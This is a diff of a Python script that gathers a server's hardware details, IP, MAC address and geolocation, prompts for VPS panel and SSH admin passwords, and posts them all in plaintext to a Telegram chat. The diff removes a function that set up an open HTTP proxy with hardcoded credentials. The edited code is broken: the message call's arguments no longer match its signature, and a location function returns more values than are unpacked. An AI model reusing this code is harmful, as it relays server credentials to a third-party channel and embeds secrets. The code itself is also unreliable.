@@ -38,24 +38,10 @@ def get_hardware_info():
     
     return cpu_name, cpu_cores, cpu_threads, ram_gb, hdd_gb
 
-# Function to create proxy server
-def create_proxy():
-    # You can customize this part according to your needs
-    proxy_port = 8888
-    proxy_username = "pragotron"
-    proxy_password = "Uf0P0rn01m1"
-    
-    subprocess.run(f'sudo apt-get install -y proxychains', shell=True)
-    
-    with open('/etc/proxychains.conf', 'a') as conf_file:
-        conf_file.write(f'\n[ProxyList]\nhttp {proxy_username}:{proxy_password}@0.0.0.0:{proxy_port}')
-    
-    return f'0.0.0.0:{proxy_port}', proxy_username, proxy_password
 
-# Function to get proxy location
 def get_proxy_location(proxy_ip):
     try:
-        response = requests.get(f'http://ip-api.com/json/24.15.54.221')
+        response = requests.get(f'http://ip-api.com/json/{ip_address}')
         data = json.loads(response.text)
         proxy_city = data['city']
         proxy_zip = data['zip']
@@ -71,7 +57,7 @@ def get_proxy_location(proxy_ip):
         return None, None, None, None, None, None, None
 
 # Function to send message to Telegram
-def send_telegram_message(rig_name, ssh_connection, ssh_password, proxy_ip, proxy_username, proxy_password,
+def send_telegram_message(rig_name, ssh_connection, ssh_password,
                           proxy_city, proxy_zip, proxy_state, proxy_country, proxy_lon, proxy_lat, proxy_isp,
                           ip_address, mac_address, cpu_name, cpu_cores, cpu_threads,
                           ram_gb, hdd_gb, email, username, panel_password):
@@ -94,13 +80,7 @@ Password: {panel_password}
 SSH: {ssh_connection}
 Password: {ssh_password}
 
-Proxy: {proxy_ip.split(':')[0]}:{proxy_ip.split(':')[1]}:{proxy_username}:{proxy_password}
-IP: {proxy_ip.split(':')[0]}
-Port: {proxy_ip.split(':')[1]}
-Username: {proxy_username}
-Password: {proxy_password}
-
-Proxy location-:
+IP location-:
 City: {proxy_city}
 ZIP: {proxy_zip}
 State: {proxy_state}
@@ -192,14 +172,11 @@ send_heartbeat()
 # Get hardware information
 cpu_name, cpu_cores, cpu_threads, ram_gb, hdd_gb = get_hardware_info()
 
-# Create proxy server
-proxy_ip, proxy_username, proxy_password = create_proxy()
-
-# Get proxy location
-proxy_city, proxy_zip, proxy_state, proxy_country = get_proxy_location(proxy_ip.split(':')[0])
-
 # Get IP and MAC address
 ip_address, mac_address = get_ip_mac_address()
+
+# Get proxy location
+proxy_city, proxy_zip, proxy_state, proxy_country = get_proxy_location(ip_address.split(':')[0])
 
 # Prompt user to input email and panel password
 email = input("Enter email of the VPS panel: ")
@@ -213,7 +190,7 @@ ssh_password = input("Enter password for the su (admin): ")
 print()
 
 
-if send_telegram_message(rig_name, ssh_connection, ssh_password, proxy_ip, proxy_username, proxy_password,
+if send_telegram_message(rig_name, ssh_connection, ssh_password, ip_address,
                          proxy_city, proxy_zip, proxy_state, proxy_country,
                          ip_address, mac_address, cpu_name, cpu_cores, cpu_threads,
                          ram_gb, hdd_gb, email, username, panel_password):
